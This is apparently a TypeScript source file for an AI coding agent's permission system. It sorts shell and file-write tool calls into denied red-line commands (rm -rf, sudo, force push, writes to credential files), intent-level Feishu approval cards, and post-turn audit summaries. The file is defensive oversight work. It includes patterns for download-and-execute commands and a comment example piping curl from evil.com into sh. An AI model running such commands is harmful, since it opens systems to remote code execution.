import { MATCHA_CONFIG_STYLE, matchaHeaderBar } from "../channels/card-style.js";
/**
 * 工具审批：意图级分级器 + 飞书审批卡协调器 + 轮次审计摘要
 *
 * 模型演进（2026-09-08 意图级，第三代）：
 *   09-02 首代「全问」→ 09-04 二代「白名单放行、不认识就问」→ 弹卡轰炸，且审批人
 *   （owner，非程序员）看不懂命令，逐条命令审批对她是无效形式：迷迷糊糊点同意比
 *   没有审批更糟。三代只审她能看懂的「意图」（对外发布/删除/装软件/系统服务），
 *   其余放行靠 git 回滚兜底，安全性改为「事后摘要验收」：
 *   - 红线（rm -rf / sudo / 改密钥 / 强推等）→ 直接拒绝，不弹卡
 *   - 硬闸意图（push / 删除 / 装卸软件 / 后台服务 / 数据库结构）→ 飞书审批卡，
 *     卡上说意图（「AI 要把代码推送到 GitHub」）不说命令语义
 *   - 其余一切放行；每轮结束发「本轮执行摘要」卡（改动文件/对外动作/删除）供验收
 *
 * 「本次会话内都允许」用 SDK 官方机制（updatedPermissions + destination:'session'），
 * 在 official.ts 的 canUseTool 返回值里生效，本模块只负责把用户选择传回去。
 */

import type { PermissionUpdate } from "@anthropic-ai/claude-agent-sdk";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";

// ==================== 红线（对齐项目 CLAUDE.md 红线清单，可按需增删）====================

interface Redline {
  /** 匹配 Bash 命令原文（大小写不敏感，空白归一后 indexOf/regex） */
  pattern: RegExp;
  /** 人话拒绝理由 */
  reason: string;
}

const REDLINES: Redline[] = [
  { pattern: /rm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)/, reason: "递归强制删除文件/目录，没有后悔药，属于红线操作" },
  { pattern: /git\s+push\s+.*--force/, reason: "强制推送会覆盖远端历史，属于红线操作" },
  { pattern: /git\s+reset\s+--hard/, reason: "硬重置会丢弃未提交的改动，属于红线操作" },
  { pattern: /git\s+rebase\b/, reason: "rebase 会改写提交历史，属于红线操作" },
  { pattern: /git\s+clean/, reason: "批量删除未跟踪文件，属于红线操作" },
  { pattern: /\bsudo\b/, reason: "以管理员权限执行，影响系统级状态，属于红线操作" },
  { pattern: /(\.env|id_rsa|id_ed25519|credentials|\.aws|\.ssh)[^\s]*\s*(>|>>)/, reason: "重定向写入密钥/凭证类文件，属于红线操作" },
  { pattern: /chmod\s+-R\s*777/, reason: "递归放开全部权限，属于红线操作" },
  { pattern: /mkfs|dd\s+if=/, reason: "磁盘级写入操作，属于红线操作" },
  { pattern: /(npm\s+publish|deploy\s+--prod)/, reason: "公开发布类操作，属于红线操作" },
];

// ==================== 硬闸意图表（2026-09-08 三代：只审她看得懂的意图）====================
// 判据 = 不可逆 / 对外 / 系统级，而不是「不认识的命令」。只读和本地可逆操作
// （node/python/解压/移动/重定向写文件等）全部放行——误操作威胁靠 git 回滚兜底，
// 安全性由「事后摘要验收」承担（见文件尾 TurnAudit）。

/** 写入放行根目录：这些目录下的 Write/Edit 直接放行。
 *  Documents 用当前用户 home 动态解析，开箱即用；可按需增删自己的工作区根。 */
const WRITE_ALLOWED_ROOTS = [
  `${os.homedir()}/Documents/`, // 全部文档区（各代码仓库 + 学习资料 + 稿件）
  "/tmp/", // 临时产物，重启即清
];

interface HardGate {
  /** 匹配单个命令段（已剥引号内容） */
  pattern: RegExp;
  /** 意图级人话：卡上说的是「AI 要干什么」，不是命令语义 */
  intent: string;
  /** 命中后的豁免判定（拿整条归一化命令）：true 则本段放行（如 push 指向私有备份仓） */
  allow?: (fullCommand: string) => boolean;
}

/** 私有备份仓白名单（2026-09-19 定：推私有仓不弹卡直接过，对齐「推私有备份仓可直接
 *  push、推开源/公开仓必须先征得同意」的约定）。
 *  格式 = owner/repo，填你自己的私有备份仓，如 ["your-name/your-private-repo"]；
 *  运行时可调 setPrivatePushRemotes() 覆盖。
 *  豁免只免弹卡：红线（--force 强推）仍拒，轮末摘要的对外动作清单仍记录本次 push。 */
const PRIVATE_PUSH_REMOTES: string[] = [];

/** 运行时覆盖私有备份仓白名单（全量替换；传空数组 = 关闭豁免，所有 push 都弹卡） */
export function setPrivatePushRemotes(list: string[]): void {
  PRIVATE_PUSH_REMOTES.length = 0;
  PRIVATE_PUSH_REMOTES.push(...list);
}

/** 判断命令里的 git push 是否指向白名单私有仓：
 *  从命令串提取 cd 目标目录（CC 惯用 `cd <repo> && git push`），读该目录
 *  .git/config 的 remote url；提不到 cd 时退回本进程 cwd 再试一次。
 *  任何一步拿不准 → false（保守：继续走弹卡，由用户审）。 */
function isPrivateRepoPush(cmd: string): boolean {
  const dirs: string[] = [];
  const cdRe = /(?:^|&&|;|\|)\s*cd\s+(?:"([^"]+)"|'([^']+)'|(\S+))/g;
  let m: RegExpExecArray | null;
  while ((m = cdRe.exec(cmd))) {
    const d = m[1] || m[2] || m[3];
    if (d) dirs.push(d);
  }
  if (!dirs.length) dirs.push(process.cwd());
  try {
    const cfg = fs.readFileSync(path.join(dirs[0], ".git", "config"), "utf-8");
    const urls = [...cfg.matchAll(/url\s*=\s*(\S+)/g)].map((x) => x[1]);
    return urls.some((u) => PRIVATE_PUSH_REMOTES.some((r) => u.includes(r)));
  } catch {
    return false;
  }
}

const HARD_GATES: HardGate[] = [
  { pattern: /\bgit\s+push\b/, intent: "把本地代码推送到 GitHub 远端仓库（对外动作）", allow: (c) => isPrivateRepoPush(c) },
  { pattern: /\brm\b/, intent: "删除文件或目录" },
  { pattern: /\bfind\b[^|]*\s-(delete|exec)\b/, intent: "删除文件或执行命令（find 写形态）" },
  { pattern: /\bbrew\s+(install|uninstall|reinstall)\b/, intent: "安装/卸载 macOS 系统软件" },
  { pattern: /\blaunchctl\s+(load|unload|kickstart|bootstrap|bootout)\b/, intent: "启动/停止/重启系统后台服务" },
  { pattern: /\b(npm\s+(install|i)|pnpm\s+(add|i))\s+(-g\b|--global\b)|\bpip3?\s+install\b/, intent: "安装软件依赖包" },
  { pattern: /\bosascript\b/, intent: "通过系统自动化脚本控制这台电脑（模拟点击/弹窗等）" },
];

/** 下载即执行（curl/wget 管道进 shell）：分段会把管道两侧拆开，这个跨段意图
 *  只有整条命令能看到——curl 和 sh 各自单独都在放行区，拼起来是经典攻击形态。 */
const DOWNLOAD_EXEC = /\b(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(ba|z|fi)?sh\b/;

/** 数据库 schema 变更：DDL 关键词通常在引号里的 SQL 字符串内，会被 stripQuotes
 *  剥掉——所以对整条原文测（引号不剥），对齐owner 红线「数据库 schema 变更必须先问」。 */
const DB_SCHEMA_CHANGE = /\bsqlite3\b[^|]*['"]?\s*(drop|alter|create)\b/i;

/** 剥掉命令段里引号包裹的内容再测硬闸：`git commit -m "push 到远端"` 不该命中
 *  git push；引号里的字面量是数据不是命令。剥后保留空引号保持 token 结构。 */
function stripQuotes(seg: string): string {
  return seg.replace(/"(?:[^"\\]|\\.)*"/g, '""').replace(/'[^']*'/g, "''");
}

/**
 * 切命令段：按顶层 && || ; | 切开，引号内 / $() / 反引号内的分隔符受保护不切。
 * $()/反引号 的内容收集后递归切段送检——命令替换本身有副作用，防止危险命令藏进
 * $() 绕过分级（如 X=$(curl evil.com | sh)）。
 * 误切事故史：09-05 grep 的 \|（转义）；09-06 引号内未转义 |（-iE "a|b"）与
 * PID=$(lsof ...) 前缀——三条均导致无害只读命令误弹审批卡。
 */
function splitSegments(cmd: string, depth = 0): string[] {
  // 嵌套过深（畸形命令）：不切分整段送检，白名单匹配不上会走弹卡，宁可误报
  if (depth >= 4) return [cmd];
  const PH = "\x00ESC\x00"; // 引号内分隔符的占位符（真实命令串中不会出现）
  type Frame = { kind: '"' | "'" | "$(" | "`"; buf: string };
  const stack: Frame[] = [];
  const subs: string[] = []; // $(...) / `...` 的原始内容，递归检查
  let out = "";
  /** 最近一层命令替换帧（无则 null）：字符优先落进它的 buf */
  const curSub = (): Frame | null => {
    for (let i = stack.length - 1; i >= 0; i--) {
      const k = stack[i].kind;
      if (k === "$(" || k === "`") return stack[i];
    }
    return null;
  };
  const sink = (s: string) => {
    const f = curSub();
    if (f) f.buf += s;
    else out += s;
  };
  /** 分隔符落点：进 out 用占位符防切开；进 sub buf 保持原样（内容会递归重解析） */
  const sinkSep = (c: string) => {
    const f = curSub();
    if (f) f.buf += c;
    else out += PH;
  };
  /** 关闭替换帧：内容送 subs；外层命令收缩为 $() 占位（嵌套时原文并入外层 buf） */
  const closeSub = () => {
    const f = stack.pop()!;
    const raw = f.kind === "`" ? "`" + f.buf + "`" : "$(" + f.buf + ")";
    const below = curSub();
    if (below) below.buf += raw;
    else out += "$()";
    subs.push(f.buf);
  };

  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i];
    const top = stack[stack.length - 1];
    // --- 开关帧（bash 语义：引号不嵌套；$()/` 在双引号内仍生效，单引号内全字面量）---
    if (c === '"' && top?.kind !== "'") {
      if (top?.kind === '"') stack.pop();
      else stack.push({ kind: '"', buf: "" });
      sink(c);
      continue;
    }
    if (c === "'" && top?.kind === "'") {
      stack.pop();
      sink(c);
      continue;
    }
    if (c === "'" && (top === undefined || top.kind === "$(" || top.kind === "`")) {
      stack.push({ kind: "'", buf: "" });
      sink(c);
      continue;
    }
    if (c === "`" && top?.kind === "`") {
      closeSub();
      continue;
    }
    if ((c === "`" || (c === "$" && cmd[i + 1] === "(")) && top?.kind !== "'") {
      stack.push({ kind: c === "`" ? "`" : "$(", buf: "" });
      if (c === "$") i++; // 连 ( 一起消费
      continue;
    }
    if (c === ")" && top?.kind === "$(") {
      closeSub();
      continue;
    }
    // --- 引号帧内：字面量（分隔符占位）；双引号内保留转义（转义的分隔符同样占位防切） ---
    if (top?.kind === '"' && c === "\\") {
      const nxt = cmd[i + 1] ?? "";
      if ("|;&".includes(nxt)) sinkSep(nxt);
      else sink(c + nxt);
      i++;
      continue;
    }
    if (top?.kind === "'" || top?.kind === '"') {
      if (c === "|" || c === ";" || c === "&") sinkSep(c);
      else sink(c);
      continue;
    }
    // --- 顶层（可能在替换帧内）---
    if (c === "\\" && "|;&".includes(cmd[i + 1] ?? "")) {
      sinkSep(cmd[i + 1]); // 转义分隔符 = 字面量，同样占位
      i++;
      continue;
    }
    if (c === "|" || c === ";" || c === "&") {
      const f = curSub();
      if (f) f.buf += c; // 替换内容里的真分隔符：原样留给递归
      else out += c;
      continue;
    }
    sink(c);
  }
  // 未闭合的替换帧（畸形命令）：内容照样送检
  for (const f of stack) {
    if ((f.kind === "$(" || f.kind === "`") && f.buf) subs.push(f.buf);
  }
  const segs = out
    .split(/\s*(?:&&|\|\||;|\|)\s*/)
    .map((s) => s.split(PH).join("|"))
    .filter(Boolean);
  return segs.concat(subs.flatMap((s) => splitSegments(s, depth + 1)));
}

// ==================== 分级器（三代：红线拒 → 硬闸问 → 其余放）====================

export type GateVerdict =
  | { verdict: "allow" }
  | { verdict: "deny"; reason: string }
  | { verdict: "ask"; explanation: string; command: string };

/** canUseTool 收到的就是未被内置规则放行的调用：
 *  Bash → 红线拒 → 分段测硬闸（防 $() 藏动作、防引号内字面量误命中）→ 其余放行；
 *  Write/Edit → 工作区内放、出工作区问；其他一切工具（含 MCP/交互）直接放行。 */
export function classifyToolUse(toolName: string, input: Record<string, unknown>): GateVerdict {
  const command = typeof input.command === "string" ? input.command : "";

  if (toolName === "Bash" && command) {
    // 空白归一，避免多空格/换行绕过 pattern
    const normalized = command.replace(/\s+/g, " ").trim();
    for (const rl of REDLINES) {
      if (rl.pattern.test(normalized)) {
        return { verdict: "deny", reason: rl.reason };
      }
    }
    if (DOWNLOAD_EXEC.test(normalized)) {
      return { verdict: "ask", explanation: "从网上下载内容并直接当作命令执行（不可信代码入口）", command: normalized };
    }
    if (DB_SCHEMA_CHANGE.test(normalized)) {
      return { verdict: "ask", explanation: "修改数据库结构（schema 变更）", command: normalized };
    }
    // 硬闸：按 && || ; | 分段（引号/$() 感知），每段剥引号内容后测意图表
    for (const seg of splitSegments(normalized)) {
      const bare = stripQuotes(seg).replace(/\s+/g, " ").trim();
      if (!bare) continue;
      for (const hg of HARD_GATES) {
        if (hg.pattern.test(bare)) {
          if (hg.allow && hg.allow(normalized)) continue; // 豁免命中（如私有仓 push）：本段放行，继续查其余段
          return { verdict: "ask", explanation: hg.intent, command: normalized };
        }
      }
    }
    return { verdict: "allow" };
  }

  // Write/Edit：工作区内直接放行（「编辑文件不需要审批」），出工作区要问
  if ((toolName === "Write" || toolName === "Edit") && typeof input.file_path === "string") {
    const p = input.file_path;
    if (WRITE_ALLOWED_ROOTS.some((root) => p.startsWith(root))) {
      return { verdict: "allow" };
    }
    return {
      verdict: "ask",
      explanation: `写入/修改文件（工作区外）：${p}`,
      command: `${toolName} ${p}`,
    };
  }

  // 其余一切工具（Read/Grep/交互类/WebFetch/MCP）放行：
  // 只读无副作用；MCP 高频刚需（lark-cli/生财），真正的对外低频动作由
  // CLAUDE.md 红线约定在模型层自律 + 轮次摘要事后可见兜底
  return { verdict: "allow" };
}

// ==================== 轮次审计 → 事后摘要卡（2026-09-08 三代安全模型）====================
// 审批只拦意图级硬闸，其余放行——放行区的安全性靠两件事兜底：git 可回滚 + 本摘要。
// canUseTool 只能见到「内置规则未放行」的调用（default 模式下 Bash/Write/Edit 全流入；
// Read/Grep 等只读不流入，只读无需审计）。摘要只报她能验收的三类动作，
// 每轮 turn 结束置底发卡——她不用翻回流式卡就能看到「这轮干了什么、跑完没有」。

export interface TurnAudit {
  /** Write/Edit 触碰的文件路径（工作区内） */
  files: Set<string>;
  /** 对外/系统级动作原文（push/装卸软件/服务变更，无论最终放行还是被拒） */
  outward: string[];
  /** rm/trash 类删除操作原文（trash 走回收站免审，但删除动作必须进摘要事后可见） */
  deletions: string[];
}

export function newTurnAudit(): TurnAudit {
  return { files: new Set(), outward: [], deletions: [] };
}

/** 清空审计（保留对象引用——canUseTool 闭包持有它，每轮 turn 结束后复用） */
export function resetTurnAudit(a: TurnAudit): void {
  a.files.clear();
  a.outward.length = 0;
  a.deletions.length = 0;
}

/** 记录一次工具调用到审计。在 canUseTool 入口调用，与判定结果无关——
 *  被拒绝的删除/推送也记：她验收时应该知道 AI 试过删什么。 */
export function auditToolUse(a: TurnAudit, toolName: string, input: Record<string, unknown>): void {
  const command = typeof input.command === "string" ? input.command : "";
  if ((toolName === "Write" || toolName === "Edit") && typeof input.file_path === "string") {
    a.files.add(input.file_path);
    return;
  }
  if (toolName !== "Bash" || !command) return;
  const normalized = command.replace(/\s+/g, " ").trim();
  for (const seg of splitSegments(normalized)) {
    const bare = stripQuotes(seg).replace(/\s+/g, " ").trim();
    if (!bare) continue;
    // trash 进回收站可逆 → 免审；免审的前提是事后可见，所以同样记删除
    if (/\b(rm|trash)\b/.test(bare)) a.deletions.push(seg.slice(0, 120));
    else if (
      /\bgit\s+push\b/.test(bare) ||
      /\bbrew\s+(install|uninstall|reinstall)\b/.test(bare) ||
      /\blaunchctl\s+(load|unload|kickstart|bootstrap|bootout)\b/.test(bare)
    ) {
      a.outward.push(seg.slice(0, 120));
    }
  }
}

/** 组摘要文本；本轮无实质动作（纯聊天/纯读）返回 null——不轰炸 */
export function summarizeAudit(a: TurnAudit): string | null {
  const parts: string[] = [];
  if (a.files.size > 0) {
    const list = [...a.files]
      .slice(0, 8)
      .map((f) => `- ${f.startsWith(os.homedir()) ? `~${f.slice(os.homedir().length)}` : f}`)
      .join("\n");
    const more = a.files.size > 8 ? `\n- …等共 ${a.files.size} 个` : "";
    parts.push(`**✏️ 改动文件（${a.files.size}）**\n${list}${more}`);
  }
  if (a.outward.length > 0) {
    parts.push(`**📤 对外/系统动作（${a.outward.length}）**\n${a.outward.map((c) => `- \`${c}\``).join("\n")}`);
  }
  if (a.deletions.length > 0) {
    parts.push(`**🗑️ 删除操作（${a.deletions.length}）**\n${a.deletions.map((c) => `- \`${c}\``).join("\n")}`);
  }
  return parts.length ? parts.join("\n\n") : null;
}

/** 摘要卡：1.0 结构（与审批卡同款 schema，生产验证可发） */
export function auditSummaryCard(summary: string): Record<string, unknown> {
  return {
    config: { wide_screen_mode: true },
    header: { title: { tag: "plain_text", content: "📋 本轮执行摘要" } },
    elements: [
      { tag: "div", text: { tag: "lark_md", content: summary } },
      {
        tag: "note",
        elements: [{ tag: "plain_text", content: "事后验收用 · 仓库内改动可用 git 回溯 · 有问题直接在聊天里说" }],
      },
    ],
  };
}

// ==================== 飞书审批卡协调器 ====================

/** 审批等待上限：超时默认拒绝（宁拒不乱跑，对齐 Hermes 策略） */
const APPROVAL_TIMEOUT_MS = 5 * 60 * 1000;

/**
 * 会话审批句柄（2026-09-06 串卡修复）：feishu-commands 按 scope 构建并传给
 * adapter，会话创建时闭包进 canUseTool——审批卡只发本会话的聊天。
 * 替代旧版模块级全局 cardSender：所有 bot 共跑一个后端进程，全局单例会被
 * 「最近一条被处理的消息」反复覆盖，多 bot 并发时审批卡发错聊天。
 */
export interface ApprovalCardHandle {
  /** 审批卡所属 scope（日志定位用） */
  scope: string;
  /** 发审批卡到本会话聊天，返回消息 id（失败 null） */
  sendCard: (card: Record<string, unknown>) => Promise<string | null>;
  /** 在审批卡下方回复状态卡（点按钮后的立即反馈） */
  replyCard: (messageId: string, card: Record<string, unknown>) => Promise<boolean>;
}

interface PendingApproval {
  resolve: (action: ApprovalAction) => void;
  timer: ReturnType<typeof setTimeout>;
}

export type ApprovalAction = "allow" | "deny" | "allow-session";

/** 待审批表：approvalId → pending */
const pending = new Map<string, PendingApproval>();

/** 审批卡按钮的 callback value 标记；onCardAction 入口据此分流，不进命令白名单 */
export interface ApprovalCardValue {
  [key: string]: unknown;
  __approval: { id: string; action: ApprovalAction };
}

export function isApprovalCardValue(value: Record<string, unknown>): value is ApprovalCardValue {
  const a = value.__approval as { id?: unknown; action?: unknown } | undefined;
  return !!a && typeof a === "object" && typeof a.id === "string" &&
    (a.action === "allow" || a.action === "deny" || a.action === "allow-session");
}

/**
 * 发审批卡并等待用户点击（或超时默认拒）。
 * canUseTool 是异步等待的——审批期间该 turn 挂起，SDK 会话超时(15min) > 审批超时(5min)，安全。
 * 无论哪个结局（放行/拒绝/超时），都在审批卡下方回一张状态卡——点完按钮立刻有回响，
 * 不用干等「跑完没」（2026-09-06 状态回写）。
 */
export async function requestApproval(
  params: { toolName: string; command: string; explanation: string },
  handle: ApprovalCardHandle
): Promise<ApprovalAction> {
  const id = `apr_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  const card = approvalCard(id, params.toolName, params.command, params.explanation);

  let messageId: string | null = null;
  try {
    messageId = await handle.sendCard(card);
  } catch (err) {
    console.log(`[Approval] ✗ 发卡异常 id=${id} scope=${handle.scope} cmd=${params.command.slice(0, 60)} err=${String(err).slice(0, 120)}`);
    return "deny";
  }
  if (!messageId) {
    console.log(`[Approval] ✗ 发卡失败（通道返回空）id=${id} scope=${handle.scope} cmd=${params.command.slice(0, 60)}`);
    return "deny";
  }
  console.log(`[Approval] ✓ 审批卡已发 id=${id} scope=${handle.scope} cmd=${params.command.slice(0, 60)}`);

  return new Promise<ApprovalAction>((resolve) => {
    let timer: ReturnType<typeof setTimeout> | undefined;
    const finish = (action: ApprovalAction, timedOut = false) => {
      clearTimeout(timer);
      pending.delete(id);
      // 状态回写：审批卡下方回一张状态卡；失败只记日志，不影响放行/拒绝本身
      handle
        .replyCard(messageId!, statusReplyCard(timedOut ? "timeout" : action))
        .catch((e) => console.log(`[Approval] ⚠ 状态卡回复失败 id=${id} err=${String(e).slice(0, 80)}`));
      resolve(action);
    };
    timer = setTimeout(() => finish("deny", true), APPROVAL_TIMEOUT_MS); // 超时默认拒
    // 不阻止进程退出
    if (typeof timer === "object" && "unref" in timer) (timer as { unref(): void }).unref();
    pending.set(id, {
      resolve: (action) => finish(action),
      timer,
    });
  });
}

/** onCardAction 入口调用：是审批按钮 → resolve 并返回 true（已处理，不再走命令路由） */
export function handleApprovalCardAction(value: ApprovalCardValue): boolean {
  const p = pending.get(value.__approval.id);
  if (!p) return true; // 过期/重复点击：已无 pending，吞掉避免当命令执行
  pending.delete(value.__approval.id);
  p.resolve(value.__approval.action);
  return true;
}

/** 把审批动作转成 SDK 的 canUseTool 返回值所需的 PermissionUpdate（仅会话内允许用） */
export function sessionAllowUpdate(toolName: string, command: string): PermissionUpdate {
  // Bash 的规则内容匹配命令前缀；其他工具按工具名放行
  const ruleContent = toolName === "Bash" && command
    ? command.split(/\s+/).slice(0, 2).join(" ") + "*"
    : undefined;
  return {
    type: "addRules",
    rules: [{ toolName, ...(ruleContent ? { ruleContent } : {}) }],
    behavior: "allow",
    destination: "session",
  };
}

/** 审批结局的状态卡文案（点按钮/超时后回复在审批卡下方，2026-09-06 状态回写） */
const STATUS_TEXT: Record<ApprovalAction | "timeout", { title: string; detail: string }> = {
  allow: {
    title: "✅ 已放行",
    detail: "命令开始执行，AI 正在继续干活。本回合跑完后，回复会更新到聊天里的流式卡片（末尾带 ⏱ 状态行）。",
  },
  "allow-session": {
    title: "✔ 已放行（本会话内同类命令不再询问）",
    detail: "命令开始执行，AI 正在继续干活。本回合跑完后，回复会更新到聊天里的流式卡片（末尾带 ⏱ 状态行）。",
  },
  deny: {
    title: "❌ 已拒绝",
    detail: "这条命令不会执行。AI 会收到拒绝说明，改用不需要审批的做法或先来问你。",
  },
  timeout: {
    title: "⏰ 5 分钟未响应",
    detail: "已按默认拒绝处理（宁拒不乱跑）。AI 会收到拒绝说明并换方案。",
  },
};

/** 状态卡：1.0 结构（与审批卡同款 schema，生产验证可发） */
function statusReplyCard(action: ApprovalAction | "timeout"): Record<string, unknown> {
  const st = STATUS_TEXT[action];
  return {
    config: { wide_screen_mode: true },
    header: { title: { tag: "plain_text", content: st.title } },
    elements: [{ tag: "div", text: { tag: "lark_md", content: st.detail } }],
  };
}

// ==================== 卡片构造（2.0 schema，对齐 card-actions.ts 风格）====================

function esc(s: string): string {
  return s.replace(/([*_`\\])/g, "\\$1").slice(0, 800);
}

function approvalCard(id: string, toolName: string, command: string, explanation: string): Record<string, unknown> {
  // 2026-10-31 2.0 抹茶迁移（形态5，owner 定）：当年阻碍 2.0 的 tag:action 已被
  // 容器按钮替代——interactive_container 挂 behaviors callback，value={__approval:...}
  // 与 1.0 同构，点击仍走 card.action.trigger → isApprovalCardValue 照常识别。
  // 按钮三态：允许=抹茶实底白字 / 会话内允许=抹茶描边 / 拒绝=白底红字（危险语义）
  const cbtn = (action: ApprovalAction, variant: "solid" | "outline" | "danger") => ({
    tag: "interactive_container",
    width: "fill",
    ...(variant === "solid"
      ? { background_style: "matcha", corner_radius: "6px" }
      : variant === "outline"
        ? { has_border: true, border_color: "matcha-line", corner_radius: "6px", background_style: "matcha-bg" }
        : { has_border: true, border_color: "grey-200", corner_radius: "6px", background_style: "bg-white" }),
    padding: "10px",
    margin: "0px 12px 8px 12px",
    behaviors: [{ type: "callback", value: { __approval: { id, action } } }],
    elements: [
      {
        tag: "markdown",
        content:
          variant === "solid"
            ? "<font color='white'>**✅ 允许**</font>"
            : variant === "outline"
              ? "**<font color='matcha-deep'>✔ 会话内允许</font>**"
              : "**<font color='red'>❌ 拒绝</font>**",
        text_align: "center",
      },
    ],
  });
  return {
    schema: "2.0",
    config: { wide_screen_mode: true, update_multi: true, ...MATCHA_CONFIG_STYLE },
    body: {
      direction: "vertical",
      padding: "0px 0px 8px 0px",
      elements: [
        matchaHeaderBar(toolName, "⚠ 待审批"),
        { tag: "markdown", content: " ", margin: "0px 12px 0px 12px" },
        {
          tag: "interactive_container",
          width: "fill",
          has_border: true,
          border_color: "matcha-line",
          corner_radius: "8px",
          background_style: "matcha-bg",
          padding: "12px",
          margin: "0px 12px 10px 12px",
          vertical_spacing: "4px",
          elements: [
            { tag: "markdown", content: `**这是什么：** ${esc(explanation)}` },
            { tag: "markdown", content: `**原始指令：**\n\`\`\`\n${esc(command)}\n\`\`\`` },
          ],
        },
        { tag: "markdown", content: " ", margin: "0px 12px 0px 12px" },
        cbtn("allow", "solid"),
        cbtn("allow-session", "outline"),
        cbtn("deny", "danger"),
        { tag: "markdown", content: " ", margin: "0px 12px 0px 12px" },
        {
          tag: "markdown",
          content: "<font color='grey'>5 分钟不响应将默认拒绝 · 同类命令选「会话内允许」后本次对话不再询问</font>",
          text_size: "notation",
          margin: "0px 12px 0px 12px",
        },
      ],
    },
  };
}
